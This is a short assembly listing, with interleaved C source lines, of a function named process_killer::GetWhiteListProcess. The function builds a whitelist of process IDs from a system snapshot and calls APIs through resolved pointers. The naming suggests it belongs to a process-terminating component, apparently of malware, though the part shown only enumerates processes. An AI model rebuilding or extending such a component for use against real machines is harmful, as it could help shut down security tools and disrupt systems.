  000b4	75 7f		 jne	 SHORT $LN10@GetWhiteLi

; 30   : 
; 31   : 			PPID Pid = (PPID)m_malloc(sizeof(PID));

  000b6	b9 18 00 00 00	 mov	 ecx, 24
  000bb	e8 00 00 00 00	 call	 ?m_malloc@@YAPEAX_K@Z	; m_malloc
  000c0	48 89 85 88 02
	00 00		 mov	 QWORD PTR Pid$4[rbp], rax

; 32   : 			if (!Pid) {

  000c7	48 83 bd 88 02
	00 00 00	 cmp	 QWORD PTR Pid$4[rbp], 0
  000cf	75 02		 jne	 SHORT $LN11@GetWhiteLi

; 33   : 				break;

  000d1	eb 77		 jmp	 SHORT $LN3@GetWhiteLi
$LN11@GetWhiteLi:

; 34   : 			}
; 35   : 
; 36   : 			Pid->dwProcessId = pe32.th32ProcessID;

  000d3	48 8b 85 88 02
	00 00		 mov	 rax, QWORD PTR Pid$4[rbp]
  000da	8b 4d 38	 mov	 ecx, DWORD PTR pe32$[rbp+8]
  000dd	89 08		 mov	 DWORD PTR [rax], ecx
$LN7@GetWhiteLi:

; 37   : 			TAILQ_INSERT_TAIL(PidList, Pid, Entries);

  000df	48 8b 85 88 02
	00 00		 mov	 rax, QWORD PTR Pid$4[rbp]
  000e6	48 c7 40 08 00
	00 00 00	 mov	 QWORD PTR [rax+8], 0
  000ee	48 8b 85 88 02
	00 00		 mov	 rax, QWORD PTR Pid$4[rbp]
  000f5	48 8b 8d 80 04
	00 00		 mov	 rcx, QWORD PTR PidList$[rbp]
  000fc	48 8b 49 08	 mov	 rcx, QWORD PTR [rcx+8]
  00100	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx
  00104	48 8b 85 80 04
	00 00		 mov	 rax, QWORD PTR PidList$[rbp]
  0010b	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  0010f	48 8b 8d 88 02
	00 00		 mov	 rcx, QWORD PTR Pid$4[rbp]
  00116	48 89 08	 mov	 QWORD PTR [rax], rcx
  00119	48 8b 85 88 02
	00 00		 mov	 rax, QWORD PTR Pid$4[rbp]
  00120	48 83 c0 08	 add	 rax, 8
  00124	48 8b 8d 80 04
	00 00		 mov	 rcx, QWORD PTR PidList$[rbp]
  0012b	48 89 41 08	 mov	 QWORD PTR [rcx+8], rax
  0012f	33 c0		 xor	 eax, eax
  00131	85 c0		 test	 eax, eax
  00133	75 aa		 jne	 SHORT $LN7@GetWhiteLi
$LN10@GetWhiteLi:

; 38   : 
; 39   : 		}
; 40   : 
; 41   : 	} while (pProcess32NextW(hSnapShot, &pe32));

  00135	48 8d 55 30	 lea	 rdx, QWORD PTR pe32$[rbp]
  00139	48 8b 4d 08	 mov	 rcx, QWORD PTR hSnapShot$[rbp]
  0013d	e8 00 00 00 00	 call	 ?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ; pProcess32NextW
  00142	85 c0		 test	 eax, eax
  00144	0f 85 41 ff ff
	ff		 jne	 $LN4@GetWhiteLi
$LN3@GetWhiteLi:

; 42   : 
; 43   : 	pCloseHandle(hSnapShot);

  0014a	48 8b 4d 08	 mov	 rcx, QWORD PTR hSnapShot$[rbp]
  0014e	e8 00 00 00 00	 call	 ?pCloseHandle@@YAHPEAX@Z ; pCloseHandle
$LN1@GetWhiteLi:

; 44   : }

  00153	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  00157	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z$rtcFrameData
  0015e	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  00163	48 8b 8d 58 04
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  0016a	48 33 cd	 xor	 rcx, rbp
  0016d	e8 00 00 00 00	 call	 __security_check_cookie
  00172	48 8d a5 68 04
	00 00		 lea	 rsp, QWORD PTR [rbp+1128]
  00179	5f		 pop	 rdi
  0017a	5d		 pop	 rbp
  0017b	c3		 ret	 0
?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z ENDP ; process_killer::GetWhiteListProcess
_TEXT	ENDS
END
